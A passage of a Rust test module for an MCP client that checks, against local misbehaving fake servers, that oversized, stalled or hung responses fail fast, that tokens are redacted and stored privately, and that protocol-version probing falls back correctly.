        thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut sock) = stream else { break };
                thread::spawn(move || {
                    // 先把请求读干净(头 + Content-Length 体),否则客户端的写会被反压,超时就测不准
                    drain_http_request(&mut sock);
                    if delay_ms > 0 {
                        thread::sleep(Duration::from_millis(delay_ms));
                    }
                    match body {
                        BodyPlan::SmallJson => {
                            let payload = br#"{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-06-18","serverInfo":{"name":"slow"}}}"#;
                            let _ = write!(
                                sock,
                                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                                payload.len()
                            );
                            let _ = sock.write_all(payload);
                            let _ = sock.flush();
                        }
                        BodyPlan::StalledOversize { bytes } | BodyPlan::HalfClosed { bytes } => {
                            let _ = write!(
                                sock,
                                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n",
                                64usize << 20
                            );
                            let chunk = vec![b'a'; 64 * 1024];
                            let mut left = bytes;
                            while left > 0 {
                                let n = chunk.len().min(left);
                                if sock.write_all(&chunk[..n]).is_err() {
                                    break;
                                }
                                left -= n;
                            }
                            let _ = sock.flush();
                            if matches!(body, BodyPlan::HalfClosed { .. }) {
                                let _ = sock.shutdown(Shutdown::Write);
                            } else {
                                // 挂住:既不再发一个字节、也不关闭连接。
                                // 有界读的实现读满上限就该自己收手;全读的实现只能等到超时。
                                thread::sleep(Duration::from_secs(30));
                            }
                        }
                    }
                });
            }
        });
        format!("http://127.0.0.1:{}/mcp", port)
    }

    fn drain_http_request(sock: &mut TcpStream) {
        let mut head = Vec::new();
        let mut byte = [0u8; 1];
        loop {
            match sock.read(&mut byte) {
                Ok(0) | Err(_) => return,
                Ok(_) => head.push(byte[0]),
            }
            if head.ends_with(b"\r\n\r\n") || head.len() > 16 * 1024 {
                break;
            }
        }
        let mut len = 0usize;
        for line in String::from_utf8_lossy(&head).to_lowercase().lines() {
            if let Some(v) = line.strip_prefix("content-length:") {
                len = v.trim().parse().unwrap_or(0);
            }
        }
        if len > 0 {
            let mut body = vec![0u8; len];
            let _ = sock.read_exact(&mut body);
        }
    }

    /// 挂死子进程:`/bin/sleep 30` —— stdin 收得下(管道缓冲),但永远不回一个字节。
    fn hung_child(timeout_ms: u64) -> Conn {
        open_conn(&stdio_spec(
            "hung",
            "/bin/sleep",
            vec!["30".into()],
            timeout_ms,
        ))
        .expect("应能起挂死子进程")
    }

    /// 超长行 stdio 子进程:一口气吐 3MB 且**不带换行**,专打「整行缓冲」。
    fn giant_line_spec(id: &str, timeout_ms: u64) -> ServerSpec {
        stdio_spec(
            id,
            "/bin/sh",
            vec![
                "-c".into(),
                "head -c 3000000 /dev/zero | tr \"\\0\" a".into(),
            ],
            timeout_ms,
        )
    }

    // ───────────────────── 敌意外部 MCP 服务器 ─────────────────────

    /// 🔴 先红:HTTP 回体是**先全读、后判上限**。
    ///
    /// 证据:`http_rpc` 里 `let text = resp.text()?;`(mcp_client.rs:433)先把整个回体读进
    /// 内存,下一行才 `if text.len() > MAX_RESPONSE_BYTES`。所以一台只发 5MiB 就挂住不关闭的
    /// 服务器,能让客户端一直等到 per-request 超时为止——上限形同虚设,内存也不设防。
    ///
    /// 期望(有界读落地后):`Read::take(MAX_RESPONSE_BYTES + 1)` 读满即 `Err("response too large")`,
    /// 远早于超时返回。判据取「耗时远小于超时」+「错误消息点名 too large」。
    #[test]
    fn http_response_over_cap_rejected_streaming() {
        let _guard = env_guard();
        let url = slow_http_server(0, BodyPlan::StalledOversize { bytes: 5 << 20 });
        let state = test_state();
        state
            .upsert(http_spec("cap", &url, 2000))
            .expect("登记服务器");
        let t0 = Instant::now();
        let err = state.connect("cap").expect_err("超上限的回体必须报错");
        let cost = t0.elapsed();
        let msg = err.to_string();
        assert!(
            cost < Duration::from_millis(1200),
            "读到上限就该收手,不该一路等到 2000ms 超时:实耗 {:?},错误 {}",
            cost,
            msg
        );
        assert!(
            msg.contains("too large"),
            "超上限应报 response too large,实得:{}",
            msg
        );
    }

    /// 🟢 慢头必须按 per-request 超时收口:服务器 3s 后才发响应头,超时 1000ms → 1s 上下返回 Err。
    #[test]
    fn http_slow_headers_time_out() {
        let _guard = env_guard();
        let url = slow_http_server(3000, BodyPlan::SmallJson);
        let state = test_state();
        state
            .upsert(http_spec("slow", &url, 1000))
            .expect("登记服务器");
        let t0 = Instant::now();
        let err = state.connect("slow").expect_err("慢头必须超时");
        let cost = t0.elapsed();
        // 双纪元:先探测 server/discover(同一 1000ms 预算)再回退 initialize ⇒ 最多两个超时预算
        assert!(
            cost >= Duration::from_millis(700) && cost < Duration::from_millis(3500),
            "超时应在 1000ms 的一到两倍内生效,实耗 {:?}(错误 {})",
            cost,
            err
        );
    }

    /// 🟢 半关闭:服务器声明 64MiB 却只发 4KiB 就关写端 —— 客户端必须立刻报错,绝不挂住。
    #[test]
    fn http_half_closed_body_errors_fast() {
        let _guard = env_guard();
        let url = slow_http_server(0, BodyPlan::HalfClosed { bytes: 4096 });
        let state = test_state();
        state
            .upsert(http_spec("half", &url, 3000))
            .expect("登记服务器");
        let t0 = Instant::now();
        let err = state.connect("half").expect_err("提前 EOF 必须报错");
        let cost = t0.elapsed();
        assert!(
            cost < Duration::from_millis(1500),
            "半关闭应立刻报错,实耗 {:?}(错误 {})",
            cost,
            err
        );
    }

    /// 🔴 先红:stdio 读线程按「整行」缓冲,一行多大就吃多大。
    ///
    /// 证据:`open_conn` 的读线程用 `BufReader::lines()`,行读完了才有机会判
    /// `if l.len() > MAX_RESPONSE_BYTES { continue; }`(mcp_client.rs:398)——
    /// 也就是说 3MB 无换行的输出会**先整块进内存**,然后被静静丢掉,调用方等到的是
    /// 「超时 / stdout 关闭」,既不知道发生了什么,也没有任何上限保护。
    ///
    /// 期望(有界读落地后):`read_until` 带 cap,读满即判死,`call` 回的错误点名 too large。
    #[test]
    fn stdio_giant_line_bounded() {
        let _guard = env_guard();
        let state = test_state();
        state
            .upsert(giant_line_spec("giant", 1500))
            .expect("登记服务器");
        // 用户先在面板点过一次「连接」(确认指纹;握手本身同样因超长行失败)
        let _ = state.connect("giant");
        let t0 = Instant::now();
        let err = state
            .call("giant", "anything", json!({}))
            .expect_err("超长行必须报错");
        let cost = t0.elapsed();
        let msg = err.to_string();
        assert!(
            cost < Duration::from_secs(5),
            "必须有界收口,实耗 {:?}",
            cost
        );
        assert!(
            msg.contains("too large"),
            "3MB 无换行的输出应被判「超上限」,实得:{}(当前是整块读完再静默丢弃)",
            msg
        );
    }

    /// 🟢 挂死子进程:`call` 必须在超时内返回 Err(不永久卡住调用线程);
    /// `disconnect` 之后子进程必须已经退出(`try_wait` 有结果),连接表也不再显示 connected。
    #[test]
    fn stdio_hung_child_times_out_and_disconnect_kills() {
        let _guard = env_guard();
        // ① 低层:直接拿 hung_child 夹具驱动 stdio_rpc,顺带核 kill + wait 的收尾语义
        let mut conn = hung_child(800);
        let Conn::Stdio { child, stdin, rx } = &mut conn else {
            panic!("夹具必须是 stdio 连接")
        };
        let req = json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {} });
        let t0 = Instant::now();
        let err = stdio_rpc(stdin, rx, child, &req, 1, Duration::from_millis(800))
            .expect_err("挂死子进程必须超时");
        let cost = t0.elapsed();
        assert!(err.to_string().contains("timeout"), "应报超时,实得:{}", err);
        assert!(
            cost >= Duration::from_millis(500) && cost < Duration::from_millis(3000),
            "超时必须按 spec 的 800ms 收口,实耗 {:?}",
            cost
        );
        assert!(
            child
                .lock()
                .unwrap()
                .try_wait()
                .expect("try_wait")
                .is_none(),
            "超时本身不杀进程(收尸交给 disconnect)"
        );
        kill_child(child);
        let _ = child.lock().unwrap().wait();
        assert!(
            child
                .lock()
                .unwrap()
                .try_wait()
                .expect("try_wait")
                .is_some(),
            "kill + wait 之后子进程必须已退出"
        );

        // ② 公开面:能连上、但对 tools/call 装死的服务器 —— call 超时,disconnect 收干净
        // 探测 server/discover 不回(装死 ⇒ 800ms 后回退旧纪元);tools/list 宣告只读的 get_time(准入过,才轮到 tools/call 装死)
        let script = stdio_script(&[
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"mute\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
            ("*'\"method\":\"tools/call\"'*", ":"),
        ]);
        let state = test_state();
        state
            .upsert(stdio_spec(
                "mute",
                "/bin/sh",
                vec!["-c".into(), script.into()],
                800,
            ))
            .expect("登记服务器");
        state.connect("mute").expect("应能连上装死服务器");
        assert_eq!(state.list()[0]["connected"], true);
        let t1 = Instant::now();
        let err2 = state
            .call("mute", "get_time", json!({}))
            .expect_err("装死的 tools/call 必须超时");
        let cost2 = t1.elapsed();
        assert!(
            err2.to_string().contains("timeout"),
            "应报超时,实得:{}",
            err2
        );
        assert!(
            cost2 < Duration::from_millis(3000),
            "call 必须在超时内收口,实耗 {:?}",
            cost2
        );
        assert!(
            state.disconnect("mute"),
            "disconnect 应杀掉子进程并摘掉连接"
        );
        assert_eq!(state.list()[0]["connected"], false);
        assert!(!state.disconnect("mute"), "重复 disconnect 不该再报成功");
    }

    #[test]
    fn slug_vectors_match_js() {
        // 与前端 slugToolName 同一向量表(前端 aiToolsExternal.test.js 逐条对拍)
        assert_eq!(
            slug_tool_name("time", "get_current_time"),
            "ext_time_get_current_time"
        );
        assert_eq!(
            slug_tool_name("Time Server", "Get-Current-Time"),
            "ext_time_server_get_current_time"
        );
        assert_eq!(slug_tool_name("时间", "查询"), "ext_");
        assert_eq!(slug_tool_name("a__b", "__c__"), "ext_a_b_c");
        assert_eq!(slug_tool_name("UPPER", "MiXeD"), "ext_upper_mixed");
        assert_eq!(slug_tool_name("s", "1tool"), "ext_s_1tool");
        let long = slug_tool_name(
            "averylongservername",
            "andanevenlongertoolnamethatkeepsgoing",
        );
        assert_eq!(long.len(), SLUG_MAX);
        assert!(
            long.starts_with("ext_averylongservername_andaneven"),
            "长名截断保留可读前缀:{}",
            long
        );
        assert_eq!(&long[long.len() - 7..long.len() - 6], "_");
        // 同输入恒等、不同输入不撞
        assert_eq!(
            long,
            slug_tool_name(
                "averylongservername",
                "andanevenlongertoolnamethatkeepsgoing"
            )
        );
        assert_ne!(
            long,
            slug_tool_name(
                "averylongservername",
                "andanevenlongertoolnamethatkeepsgoinX"
            )
        );
    }

    #[test]
    fn fnv_hex6_is_stable_and_six_hex() {
        let h = fnv1a_hex6("ext_abc");
        assert_eq!(h.len(), 6);
        assert!(h.chars().all(|c| c.is_ascii_hexdigit()));
        assert_eq!(h, fnv1a_hex6("ext_abc"));
        assert_ne!(h, fnv1a_hex6("ext_abd"));
    }

    #[test]
    fn redact_spec_never_leaks_tokens() {
        let mut headers = HashMap::new();
        headers.insert(
            "Authorization".to_string(),
            "Bearer super-secret-token".to_string(),
        );
        headers.insert("X-Trace".to_string(), "1".to_string());
        let spec = ServerSpec {
            id: "s1".into(),
            name: "远端".into(),
            enabled: true,
            transport: Transport::Http {
                url: "https://example.test/mcp".into(),
                headers,
            },
            timeout_ms: 0,
            allow_tools: vec![],
            read_only_only: true,
        };
        let v = redact_spec(&spec);
        let text = v.to_string();
        assert!(
            !text.contains("super-secret-token"),
            "脱敏后绝不含令牌:{}",
            text
        );
        assert_eq!(v["transport"]["hasAuth"], true);
        assert_eq!(v["timeoutMs"], DEFAULT_TIMEOUT_MS);
        let mut env = HashMap::new();
        env.insert("API_KEY".to_string(), "k-123".to_string());
        let spec2 = ServerSpec {
            id: "s2".into(),
            name: "本机".into(),
            enabled: false,
            transport: Transport::Stdio {
                command: "uvx".into(),
                args: vec!["mcp-server-time".into()],
                env,
                cwd: None,
            },
            timeout_ms: 999_999,
            allow_tools: vec!["get_current_time".into()],
            read_only_only: false,
        };
        let v2 = redact_spec(&spec2);
        assert!(!v2.to_string().contains("k-123"));
        assert_eq!(v2["transport"]["hasEnv"], true);
        assert_eq!(v2["timeoutMs"], MAX_TIMEOUT_MS, "超时上限封顶");
    }

    #[test]
    fn sse_body_picks_matching_id_and_skips_notifications() {
        let body = "event: message\ndata: {\"jsonrpc\":\"2.0\",\"method\":\"notifications/x\"}\n\nevent: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":9,\"result\":{\"ok\":true}}\n\n";
        let v = sse_first_json(body, Some(json!(9))).unwrap();
        assert_eq!(v["result"]["ok"], true);
        assert!(
            sse_first_json(body, Some(json!(10))).is_err(),
            "id 不匹配 → 错误,绝不错认别人的回体"
        );
        assert!(sse_first_json("event: message\ndata: not json\n\n", Some(json!(1))).is_err());
    }

    #[test]
    fn kill_switch_env_denies() {
        let _guard = env_guard();
        std::env::set_var(MCP_CLIENT_KILL_ENV, "0");
        assert!(!client_allowed());
        let state = test_state();
        assert!(state.connect("nope").is_err());
        std::env::remove_var(MCP_CLIENT_KILL_ENV);
        assert!(client_allowed());
    }

    /// 编辑令牌留空 = 保留旧令牌:keep_headers 只在「来稿 headers 空 且 旧稿有」时沿用;来稿带新令牌则替换;普通 upsert 照旧清空
    #[test]
    fn upsert_keeping_preserves_old_headers_only_when_asked() {
        let state = test_state();
        let mut headers = HashMap::new();
        headers.insert("Authorization".to_string(), "Bearer old".to_string());
        let mut spec = http_spec("k", "https://example.test/mcp", 2000);
        spec.transport = Transport::Http {
            url: "https://example.test/mcp".into(),
            headers,
        };
        state.upsert(spec).unwrap();
        // 编辑:改显示名、令牌留空、keep ⇒ 旧令牌保留
        let mut edit = http_spec("k", "https://example.test/mcp2", 2000);
        edit.name = "改名".into();
        state.upsert_keeping(edit, true).unwrap();
        let got = state.spec_of("k").unwrap();
        assert_eq!(got.name, "改名");
        match &got.transport {
            Transport::Http { url, headers } => {
                assert_eq!(url, "https://example.test/mcp2");
                assert_eq!(
                    headers.get("Authorization").map(String::as_str),
                    Some("Bearer old")
                );
            }
            _ => panic!("应仍为 http"),
        }
        // 编辑:带新令牌 + keep ⇒ 替换
        let mut replace = http_spec("k", "https://example.test/mcp2", 2000);
        let mut h2 = HashMap::new();
        h2.insert("Authorization".to_string(), "Bearer new".to_string());
        replace.transport = Transport::Http {
            url: "https://example.test/mcp2".into(),
            headers: h2,
        };
        state.upsert_keeping(replace, true).unwrap();
        match &state.spec_of("k").unwrap().transport {
            Transport::Http { headers, .. } => {
                assert_eq!(
                    headers.get("Authorization").map(String::as_str),
                    Some("Bearer new")
                )
            }
            _ => panic!("应仍为 http"),
        }
        // 普通 upsert(不 keep)令牌空 ⇒ 清空(与此前行为一致,「删除令牌」仍可达)
        state
            .upsert(http_spec("k", "https://example.test/mcp2", 2000))
            .unwrap();
        match &state.spec_of("k").unwrap().transport {
            Transport::Http { headers, .. } => assert!(headers.is_empty()),
            _ => panic!("应仍为 http"),
        }
    }

    #[test]
    fn config_file_is_private_and_roundtrips() {
        let dir = std::env::temp_dir().join(format!("horosa-mcpclient-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let state = test_state();
        state.bind_dir(&dir);
        let mut headers = HashMap::new();
        headers.insert("Authorization".to_string(), "Bearer t".to_string());
        state
            .upsert(ServerSpec {
                id: "s1".into(),
                name: "远端".into(),
                enabled: true,
                transport: Transport::Http {
                    url: "https://x.test/mcp".into(),
                    headers,
                },
                timeout_ms: 0,
                allow_tools: vec![],
                read_only_only: true,
            })
            .unwrap();
        let path = dir.join(MCP_CLIENTS_FILE);
        assert!(path.exists());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
                0o600,
                "令牌文件必须 0600"
            );
        }
        // 列表回页面的一律脱敏
        let listed = state.list();
        assert_eq!(listed.len(), 1);
        assert!(!listed[0].to_string().contains("Bearer t"));
        assert_eq!(listed[0]["connected"], false);
        // 重新载入 = 同一份(令牌留在盘上,只是不回页面)
        let state2 = test_state();
        state2.bind_dir(&dir);
        assert_eq!(state2.list().len(), 1);
        assert!(state2.remove("s1").unwrap());
        assert_eq!(state2.list().len(), 0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn stdio_transport_roundtrip_and_dead_child() {
        let _guard = env_guard();
        // 用一个最小 JSON-RPC 回声服务(sh + 逐行读)当外部服务器
        let script = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"fake\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"description\":\"d\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
            ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"12:00\"}],\"isError\":false}"),
        ]);
        let state = test_state();
        state
            .upsert(ServerSpec {
                id: "t".into(),
                name: "假时间服务".into(),
                enabled: true,
                transport: Transport::Stdio {
                    command: "/bin/sh".into(),
                    args: vec!["-c".into(), script.into()],
                    env: HashMap::new(),
                    cwd: None,
                },
                timeout_ms: 5000,
                allow_tools: vec![],
                read_only_only: true,
            })
            .unwrap();
        let out = state.connect("t").expect("应连上假 stdio 服务");
        assert_eq!(out["era"], "legacy", "-32601 的 server/discover ⇒ 旧纪元");
        assert_eq!(out["tools"][0]["name"], "get_time");
        assert_eq!(out["tools"][0]["annotations"]["readOnlyHint"], true);
        let call = state.call("t", "get_time", json!({})).expect("应能调用");
        assert_eq!(call["content"][0]["text"], "12:00");
        assert_eq!(state.list()[0]["connected"], true);
        assert!(state.disconnect("t"), "断开应杀掉子进程");
        assert_eq!(state.list()[0]["connected"], false);
        // 关开关的服务器不许连
        let mut spec = state.spec_of("t").unwrap();
        spec.enabled = false;
        state.upsert(spec).unwrap();
        assert!(state.connect("t").is_err());
    }

    // ───────────────────── 2026-07-28 双纪元探测 + 壳侧准入 ─────────────────────

    /// 逐行 JSON-RPC 假服务器脚本:按 case 模式回固定 result/error 片段,id 从请求行里抠出来回填
    /// (探测占用了 id 1,固定 id 的老写法会错配);片段为 `:` 表示装死不回。
    fn stdio_script(arms: &[(&str, &str)]) -> String {
        let mut s = String::from("while IFS= read -r line; do\n  id=$(printf '%s' \"$line\" | sed -n 's/.*\"id\":\\([0-9][0-9]*\\).*/\\1/p')\n  case \"$line\" in\n");
        for (pattern, body) in arms {
            if *body == ":" {
                s.push_str(&format!("    {}) : ;;\n", pattern));
            } else {
                s.push_str(&format!(
                    "    {}) echo '{{\"jsonrpc\":\"2.0\",\"id\":'\"$id\"',{}}}' ;;\n",
                    pattern, body
                ));
            }
        }
        s.push_str("  esac\ndone");
        s
    }

    /// 双纪元假 HTTP 服务器(tiny_http):记录每个请求 `method|v=<版本头>|m=<Mcp-Method>|n=<Mcp-Name>|s=<有会话头>|meta=<体带 _meta 版本>`。
    /// 模式:modern(现代;initialize ⇒ 404 -32601)/ legacy(discover ⇒ 400 纯文本,同旧纪元的本机服务)/ modern32022(discover ⇒ 400 -32022 只支持 2027)/ input_required。
    fn era_http_server(mode: &'static str) -> (String, thread::JoinHandle<Vec<String>>) {
        let server = tiny_http::Server::http("127.0.0.1:0").expect("bind");
        let port = server.server_addr().to_ip().map(|a| a.port()).unwrap_or(0);
        let url = format!("http://127.0.0.1:{port}/mcp");
        let h = thread::spawn(move || {
            let mut seen = Vec::new();
            for _ in 0..12 {
                let Ok(Some(mut req)) = server.recv_timeout(Duration::from_secs(2)) else {
                    break;
                };
                let mut body = String::new();
                let _ = req.as_reader().read_to_string(&mut body);
                let hv = |name: &'static str| {
                    req.headers()
                        .iter()
                        .find(|h| h.field.equiv(name))
                        .map(|h| h.value.as_str().to_string())
                        .unwrap_or_default()
                };
                let v: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
                let method = v
                    .get("method")
                    .and_then(|m| m.as_str())
                    .unwrap_or("")
                    .to_string();
                let has_meta = v
                    .get("params")
                    .and_then(|p| p.get("_meta"))
                    .and_then(|m| m.get(META_PROTOCOL_VERSION))
                    .is_some();
                seen.push(format!(
                    "{}|v={}|m={}|n={}|s={}|meta={}",
                    method,
                    hv("MCP-Protocol-Version"),
                    hv("Mcp-Method"),
                    hv("Mcp-Name"),
                    !hv("Mcp-Session-Id").is_empty(),
                    has_meta
                ));
                let id = v.get("id").cloned().unwrap_or(Value::Null);
                let json = |status: u16, val: Value| {
                    tiny_http::Response::from_string(val.to_string())
                        .with_status_code(status)
                        .with_header(
                            tiny_http::Header::from_bytes("Content-Type", "application/json")
                                .unwrap(),
                        )
                };
                let name_ok =
                    hv("Mcp-Name") == v["params"]["name"].as_str().unwrap_or("").to_string();
                let resp = match (mode, method.as_str()) {
                    ("legacy", "server/discover") => tiny_http::Response::from_string("unsupported protocol version").with_status_code(400),
                    ("legacy", "initialize") => json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "protocolVersion": "2025-06-18", "capabilities": { "tools": {} }, "serverInfo": { "name": "legacy-fake" } } })).with_header(tiny_http::Header::from_bytes("Mcp-Session-Id", "sess-1").unwrap()),
                    ("legacy", "tools/list") => json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "tools": [{ "name": "get_time", "inputSchema": { "type": "object" }, "annotations": { "readOnlyHint": true } }] } })),
                    ("legacy", "tools/call") => json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "content": [{ "type": "text", "text": "legacy 12:00" }], "isError": false } })),
                    ("legacy", _) if id.is_null() => tiny_http::Response::from_string("").with_status_code(202),
                    ("modern32022", "server/discover") => json(400, json!({ "jsonrpc": "2.0", "id": id, "error": { "code": -32022, "message": "unsupported protocol version", "data": { "supported": ["2027-01-01"], "requested": "2026-07-28" } } })),
                    (_, "initialize") => json(404, json!({ "jsonrpc": "2.0", "id": id, "error": { "code": -32601, "message": "method not found" } })),
                    (_, "server/discover") => json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "resultType": "complete", "supportedVersions": ["2026-07-28"], "capabilities": { "tools": { "listChanged": false } }, "_meta": { "io.modelcontextprotocol/serverInfo": { "name": "modern-fake", "version": "1" } }, "ttlMs": 3600000, "cacheScope": "public" } })),
                    (_, "tools/list") if hv("Mcp-Method") == "tools/list" && has_meta => {
                        if mode == "input_required" {
                            json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "resultType": "input_required", "tools": [] } }))
                        } else {
                            json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "resultType": "complete", "tools": [{ "name": "get_time", "inputSchema": { "type": "object" }, "annotations": { "readOnlyHint": true } }, { "name": "write_note", "inputSchema": { "type": "object" } }], "ttlMs": 30000, "cacheScope": "private", "_meta": { "io.modelcontextprotocol/serverInfo": { "name": "modern-fake" } } } }))
                        }
                    }
                    (_, "tools/call") if name_ok && has_meta => json(200, json!({ "jsonrpc": "2.0", "id": id, "result": { "resultType": "complete", "content": [{ "type": "text", "text": "modern 12:00" }], "isError": false } })),
                    _ => json(400, json!({ "jsonrpc": "2.0", "id": id, "error": { "code": -32020, "message": "header mismatch" } })),
                };
                let _ = req.respond(resp);
            }
            seen
        });
        (url, h)
    }

    /// 🟢 现代服务器:探测 server/discover 得 DiscoverResult ⇒ 此后 tools/list / tools/call 每请求带 _meta 与三头、永不 initialize、永不带会话头。
    #[test]
    fn http_probe_modern_server_uses_per_request_meta_and_headers() {
        let _guard = env_guard();
        let (url, h) = era_http_server("modern");
        let state = test_state();
        state.upsert(http_spec("m", &url, 3000)).unwrap();
        let out = state.connect("m").expect("现代服务器应连上");
        assert_eq!(out["era"], "modern");
        assert_eq!(out["protocolVersion"], "2026-07-28");
        assert_eq!(out["serverInfo"]["name"], "modern-fake");
        assert_eq!(out["tools"].as_array().map(|a| a.len()), Some(2));
        let call = state
            .call("m", "get_time", json!({}))
            .expect("现代 tools/call");
        assert_eq!(call["content"][0]["text"], "modern 12:00");
        state.disconnect("m");
        let seen = h.join().unwrap();
        assert!(
            seen.iter().all(|s| !s.starts_with("initialize|")),
            "现代服务器永远看不到 initialize:{seen:?}"
        );
        assert!(
            seen.iter().all(|s| s.contains("|s=false|")),
            "现代纪元永不带会话头:{seen:?}"
        );
        assert!(
            seen.iter()
                .all(|s| s.contains("|v=2026-07-28|") && s.ends_with("|meta=true")),
            "每请求都带版本头与 _meta:{seen:?}"
        );
        assert!(
            seen.iter()
                .any(|s| s.starts_with("server/discover|") && s.contains("|m=server/discover|")),
            "{seen:?}"
        );
        assert!(
            seen.iter()
                .any(|s| s.starts_with("tools/call|") && s.contains("|m=tools/call|n=get_time|")),
            "{seen:?}"
        );
    }

    /// 🟢 旧服务器(对 server/discover 回 400 纯文本 = 关掉现代纪元的本机服务):回退 initialize 握手,线上形态同今日(2025-06-18 头 + 会话头)。
    #[test]
    fn http_probe_legacy_server_falls_back_to_initialize() {
        let _guard = env_guard();
        let (url, h) = era_http_server("legacy");
        let state = test_state();
        state.upsert(http_spec("l", &url, 3000)).unwrap();
        let out = state.connect("l").expect("旧服务器应回退连上");
        assert_eq!(out["era"], "legacy");
        assert_eq!(out["protocolVersion"], "2025-06-18");
        assert_eq!(out["serverInfo"]["name"], "legacy-fake");
        let call = state
            .call("l", "get_time", json!({}))
            .expect("旧纪元 tools/call");
        assert_eq!(call["content"][0]["text"], "legacy 12:00");
        state.disconnect("l");
        let seen = h.join().unwrap();
        assert!(
            seen[0].starts_with("server/discover|v=2026-07-28|m=server/discover|"),
            "先以现代形态探测:{seen:?}"
        );
        assert!(
            seen.iter()
                .any(|s| s == "initialize|v=2025-06-18|m=|n=|s=false|meta=false"),
            "回退 initialize 线上字节同今日:{seen:?}"
        );
        assert!(
            seen.iter()
                .any(|s| s.starts_with("tools/call|v=2025-06-18|m=|n=|s=true|meta=false")),
            "旧纪元后续请求带会话头、不带三头与 _meta:{seen:?}"
        );
    }

    /// 🟢 现代服务器回 -32022(只支持别的版本):是现代服务器但无共同版本 ⇒ 报错,**不**回退 initialize。
    #[test]
    fn http_probe_modern_error_minus_32022_does_not_fall_back() {
        let _guard = env_guard();
        let (url, h) = era_http_server("modern32022");
        let state = test_state();
        state.upsert(http_spec("v", &url, 3000)).unwrap();
        let err = state.connect("v").expect_err("无共同版本必须报错");
        assert!(err.to_string().contains("protocol version"), "{err}");
        let seen = h.join().unwrap();
        assert_eq!(seen.len(), 1, "只发了一次探测,没有回退 initialize:{seen:?}");
        // 纯函数向量
        assert_eq!(
            classify_discover(
                &json!({ "result": { "supportedVersions": ["2026-07-28", "2027-01-01"] } })
            )
            .unwrap(),
            Era::Modern("2026-07-28".into())
        );
        assert_eq!(
            classify_discover(&json!({ "result": {} })).unwrap(),
            Era::Modern("2026-07-28".into()),
            "未列 supportedVersions 按宽容处理"
        );
        assert!(
            classify_discover(&json!({ "result": { "supportedVersions": ["2027-01-01"] } }))
                .is_err()
        );
        assert_eq!(
            classify_discover(&json!({ "error": { "code": -32601, "message": "nope" } })).unwrap(),
            Era::Legacy
        );
        assert_eq!(
            classify_discover(&json!({ "error": { "code": -32602, "message": "bad params" } }))
                .unwrap(),
            Era::Legacy
        );
        assert!(
            classify_discover(
                &json!({ "error": { "code": -32020, "message": "header mismatch" } })
            )
            .is_err(),
            "现代服务器拒探测 ⇒ 不伪装旧纪元"
        );
        assert_eq!(
            classify_discover(
                &json!({ "error": { "code": -32022, "data": { "supported": ["2026-07-28"] } } })
            )
            .unwrap(),
            Era::Modern("2026-07-28".into())
        );
        assert_eq!(classify_discover(&json!("junk")).unwrap(), Era::Legacy);
    }

    /// 🟢 stdio 三脚本:现代(discover 回 DiscoverResult;tools/list 只认带 _meta 的行)/ 旧(-32601 ⇒ initialize)/ 装死(探测 1 s 超时 ⇒ 旧纪元,不杀子进程)。
    #[test]
    fn stdio_probe_modern_and_legacy_scripts() {
        let _guard = env_guard();
        let modern = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"result\":{\"resultType\":\"complete\",\"supportedVersions\":[\"2026-07-28\"],\"_meta\":{\"io.modelcontextprotocol/serverInfo\":{\"name\":\"modern-stdio\"}}}"),
            ("*'\"method\":\"initialize\"'*", "\"error\":{\"code\":-32601,\"message\":\"method not found\"}"),
            ("*'\"method\":\"tools/list\"'*'\"_meta\"'*", "\"result\":{\"resultType\":\"complete\",\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}],\"_meta\":{\"io.modelcontextprotocol/serverInfo\":{\"name\":\"modern-stdio\"}}}"),
            ("*'\"method\":\"tools/list\"'*", "\"error\":{\"code\":-32602,\"message\":\"missing _meta\"}"),
            ("*'\"method\":\"tools/call\"'*'\"_meta\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"modern-stdio 12:00\"}],\"isError\":false}"),
        ]);
        let state = test_state();
        state
            .upsert(stdio_spec("ms", "/bin/sh", vec!["-c".into(), modern], 3000))
            .unwrap();
        let out = state.connect("ms").expect("现代 stdio 应连上");
        assert_eq!(out["era"], "modern");
        assert_eq!(out["serverInfo"]["name"], "modern-stdio");
        assert_eq!(
            state.call("ms", "get_time", json!({})).unwrap()["content"][0]["text"],
            "modern-stdio 12:00"
        );
        assert!(state.disconnect("ms"));

        let legacy = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
